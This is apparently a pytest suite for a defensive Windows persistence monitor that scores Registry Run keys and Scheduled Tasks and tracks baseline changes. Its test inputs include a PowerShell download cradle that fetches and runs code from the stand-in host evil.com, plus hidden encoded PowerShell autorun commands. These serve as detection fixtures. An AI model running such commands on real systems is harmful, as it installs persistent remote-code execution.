"""
Unit tests for AEGIS Persistence Monitor (FR-03).
Covers Windows Registry autorun keys and Scheduled Tasks persistence detection.
Runs seamlessly on both Windows and non-Windows CI using injectable adapters.
"""

from __future__ import annotations

import platform
import pytest

from persistence_monitor import (
    PersistenceItem,
    PersistenceMonitor,
    RegistryPersistenceScanner,
    ScheduledTaskPersistenceScanner,
    evaluate_persistence_risk,
)


class TestRiskEvaluation:
    def test_benign_allowlisted_entry(self):
        score, factors, severity, _ = evaluate_persistence_risk(
            r"C:\Program Files\Microsoft OneDrive\OneDrive.exe /background",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "OneDrive",
            check_file_exists=False,
        )
        assert severity == "low"
        assert "benign_allowlisted" in factors
        assert score <= 20

    def test_powershell_encoded_stealth(self):
        score, factors, severity, _ = evaluate_persistence_risk(
            r"powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAA...",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
            "WindowsUpdateService",
            check_file_exists=False,
        )
        assert severity in ("high", "critical")
        assert "encoded_or_stealth_arguments" in factors
        assert any("script_launcher" in f for f in factors)
        assert score >= 75

    def test_temp_path_execution(self):
        score, factors, severity, _ = evaluate_persistence_risk(
            r"C:\Users\Admin\AppData\Local\Temp\malware.exe",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "TempRunner",
            check_file_exists=False,
        )
        assert severity in ("high", "critical")
        assert "user_writable_or_temp_path" in factors
        assert score >= 45

    def test_download_cradle_detection(self):
        score, factors, severity, _ = evaluate_persistence_risk(
            r"powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a')",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
            "Updater",
            check_file_exists=False,
        )
        assert severity == "critical"
        assert "network_download_cradle" in factors
        assert score >= 80

    def test_script_file_launcher(self):
        score, factors, severity, _ = evaluate_persistence_risk(
            r"wscript.exe //B C:\Users\Public\script.vbs",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "VbsTask",
            check_file_exists=False,
        )
        assert "script_file_execution" in factors
        assert any("script_launcher" in f for f in factors)
        assert score >= 60


class TestRegistryPersistenceScanner:
    def test_custom_mock_registry_reader_64_and_32_bit(self):
        mock_data = {
            ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\Run", "64bit"): [
                ("NativeApp", r"C:\Program Files\App\app.exe"),
            ],
            ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\Run", "32bit"): [
                ("Wow64Malware", r"C:\Windows\Temp\loader32.exe"),
            ],
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run", "native"): [
                ("OneDrive", r"C:\Users\Admin\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background"),
            ],
        }

        def mock_reader(hive: str, subkey: str, view: str):
            return mock_data.get((hive, subkey, view), [])

        scanner = RegistryPersistenceScanner(registry_reader=mock_reader)
        items = scanner.scan()

        assert len(items) == 3
        names = {item.name: item for item in items}
        assert "NativeApp" in names
        assert names["NativeApp"].view == "64bit"

        assert "Wow64Malware" in names
        assert names["Wow64Malware"].view == "32bit"
        assert names["Wow64Malware"].severity in ("high", "critical")

        assert "OneDrive" in names
        assert names["OneDrive"].severity == "low"

    @pytest.mark.skipif(platform.system() != "Windows", reason="Windows only live registry test")
    def test_live_windows_registry_read(self):
        scanner = RegistryPersistenceScanner()
        items = scanner.scan()
        # Scan should run and return a list without error
        assert isinstance(items, list)


class TestScheduledTaskPersistenceScanner:
    def test_custom_mock_task_runner(self):
        mock_tasks = [
            {
                "TaskName": "LegitSystemTask",
                "TaskPath": r"\Microsoft\Windows\Defrag",
                "State": "Ready",
                "Author": "Microsoft",
                "Actions": r"C:\Windows\System32\defrag.exe -c",
            },
            {
                "TaskName": "SuspiciousPersistenceTask",
                "TaskPath": r"\UserTasks",
                "State": "Ready",
                "Author": r"NT AUTHORITY\SYSTEM",
                "Actions": r"powershell.exe -w hidden -enc VGVzdA==",
            },
        ]

        scanner = ScheduledTaskPersistenceScanner(task_runner=lambda: mock_tasks)
        items = scanner.scan()

        assert len(items) == 2
        suspicious = [i for i in items if i.name == "SuspiciousPersistenceTask"][0]
        assert suspicious.severity in ("high", "critical")
        assert "encoded_or_stealth_arguments" in suspicious.risk_factors


class TestPersistenceMonitorDeduplicationAndDiffing:
    def test_baseline_and_diffing_lifecycle(self):
        state = {
            "reg": [("App1", r"C:\Program Files\App1\app1.exe")],
            "tasks": [{"TaskName": "Task1", "TaskPath": "\\", "Actions": "task1.exe"}],
        }

        def mock_reader(hive, subkey, view):
            if hive == "HKCU" and subkey.endswith(r"\Run") and view == "native":
                return list(state["reg"])
            return []

        def mock_tasks():
            return state["tasks"]

        reg_scanner = RegistryPersistenceScanner(registry_reader=mock_reader)
        task_scanner = ScheduledTaskPersistenceScanner(task_runner=mock_tasks)
        monitor = PersistenceMonitor(reg_scanner, task_scanner)

        # 1. First scan: establishes baseline, no duplicate alerts
        changes1 = monitor.check_for_changes()
        assert monitor.is_baseline_established is True
        assert len(changes1["added"]) == 0
        assert len(changes1["modified"]) == 0
        assert len(changes1["removed"]) == 0

        # 2. Second scan with identical items: NO duplicate alerts generated!
        changes2 = monitor.check_for_changes()
        assert len(changes2["added"]) == 0
        assert len(changes2["modified"]) == 0
        assert len(changes2["removed"]) == 0

        # 3. Attacker adds suspicious autorun entry
        state["reg"].append(("EvilAutorun", r"powershell.exe -w hidden -enc AAA=="))
        changes3 = monitor.check_for_changes()
        assert len(changes3["added"]) == 1
        added_item = changes3["added"][0]
        assert added_item.name == "EvilAutorun"
        assert added_item.severity in ("high", "critical")

        # Events generated
        events = monitor.generate_events(changes3)
        assert len(events) == 1
        assert events[0]["category"] == "fim"
        assert "EvilAutorun" in events[0]["title"]
        assert events[0]["details"]["operation"] == "created"

        # 4. Third scan with same new item: NO duplicate alert!
        changes4 = monitor.check_for_changes()
        assert len(changes4["added"]) == 0

        # 5. Entry modified
        state["reg"][0] = ("App1", r"C:\Program Files\App1\app1_modified.exe")
        changes5 = monitor.check_for_changes()
        assert len(changes5["modified"]) == 1
        assert changes5["modified"][0].name == "App1"

        # 6. Entry removed
        state["reg"].pop()  # remove EvilAutorun
        changes6 = monitor.check_for_changes()
        assert len(changes6["removed"]) == 1
        assert changes6["removed"][0].name == "EvilAutorun"
